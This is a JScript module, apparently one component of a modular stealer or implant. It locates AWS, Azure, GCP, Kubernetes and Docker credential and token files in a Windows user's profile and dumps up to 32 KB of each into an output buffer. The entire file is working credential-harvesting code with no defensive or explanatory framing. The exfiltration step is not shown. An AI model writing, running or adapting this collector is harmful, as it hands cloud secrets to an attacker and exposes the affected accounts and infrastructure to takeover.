// chunk: collectors/cloud_creds
// depends: core/emit_buffer, core/file_ops
// provides: collect_cloud_creds
// format: jscript

function collect_cloud_creds() {
    emit("\r\n=== CLOUD CREDENTIALS ===\r\n");
    var home = _s.ExpandEnvironmentStrings("%USERPROFILE%");
    var creds = [
        {name: "AWS credentials", path: home + "\\.aws\\credentials"},
        {name: "AWS config", path: home + "\\.aws\\config"},
        {name: "Azure profile", path: home + "\\.azure\\azureProfile.json"},
        {name: "Azure tokens", path: home + "\\.azure\\accessTokens.json"},
        {name: "GCP creds", path: _s.ExpandEnvironmentStrings("%APPDATA%") + "\\gcloud\\credentials.db"},
        {name: "GCP properties", path: _s.ExpandEnvironmentStrings("%APPDATA%") + "\\gcloud\\properties"},
        {name: "Kube config", path: home + "\\.kube\\config"},
        {name: "Docker config", path: home + "\\.docker\\config.json"}
    ];
    for (var i = 0; i < creds.length; i++) {
        if (file_exists(creds[i].path)) {
            emit("  " + creds[i].name + ": FOUND\r\n");
            emit(read_file(creds[i].path, 32768));
            emit("\r\n");
        }
    }
}
